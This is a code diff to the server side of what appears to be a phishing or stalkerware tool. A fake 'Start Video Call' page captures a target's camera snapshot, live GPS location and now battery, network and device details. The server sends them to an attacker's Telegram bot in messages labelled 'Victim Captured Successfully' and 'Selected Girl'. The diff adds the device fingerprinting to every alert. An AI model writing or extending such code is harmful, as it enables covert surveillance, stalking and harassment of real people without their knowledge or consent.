@@ -23,12 +23,14 @@ function dataURItoBuffer(dataURI) {
 // Log endpoint: receives photo & location and sends to Telegram bot
 app.post('/api/log', async (req, res) => {
   try {
-    const { name, photo, lat, lon, acc, ref, status, isLocationUpdate } = req.body;
+    const { name, photo, lat, lon, acc, ref, status, isLocationUpdate, battery, network, device } = req.body;
     const targetChatId = ref || DEFAULT_CHAT_ID;
     const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
 
+    const deviceInfoText = `📱 **Device:** ${device || 'Unknown'}\n🔋 **Battery:** ${battery || 'Unknown'}\n📶 **Network:** ${network || 'Unknown'}`;
+
     if (status === 'clicked') {
-      const clickMsg = `⚡ **Instant Alert!**\n👤 User clicked Start Video Call for: *${name || 'Haleema'}*\n🕒 Time: ${new Date().toLocaleString()}\n⏳ Capturing camera snapshot & GPS location...`;
+      const clickMsg = `⚡ **Instant Alert!**\n👤 User clicked Start Video Call for: *${name || 'Haleema'}*\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}\n⏳ Capturing camera snapshot & GPS location...`;
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -43,7 +45,7 @@ app.post('/api/log', async (req, res) => {
 
     if (isLocationUpdate && lat && lon) {
       const mapLink = `https://www.google.com/maps?q=${lat},${lon} (Accuracy: ${acc || 'Unknown'}m)`;
-      const locMsg = `📍 **Live GPS Location Update:**\n👤 Victim: ${name || 'Haleema'}\n🗺️ ${mapLink}\n🕒 Time: ${new Date().toLocaleString()}`;
+      const locMsg = `📍 **Live GPS Location Update:**\n👤 Victim: ${name || 'Haleema'}\n🗺️ ${mapLink}\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}`;
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -60,7 +62,7 @@ app.post('/api/log', async (req, res) => {
       ? `https://www.google.com/maps?q=${lat},${lon} (Accuracy: ${acc || 'Unknown'}m)` 
       : "Location loading or not available";
 
-    const caption = `📸 **Victim Captured Successfully!**\n👤 Selected Girl: ${name || 'Haleema'}\n📍 Location: ${mapLink}\n🕒 Time: ${new Date().toLocaleString()}`;
+    const caption = `📸 **Victim Captured Successfully!**\n👤 Selected Girl: ${name || 'Haleema'}\n📍 Location: ${mapLink}\n${deviceInfoText}\n🕒 Time: ${new Date().toLocaleString()}`;
 
     if (photo) {
       try {
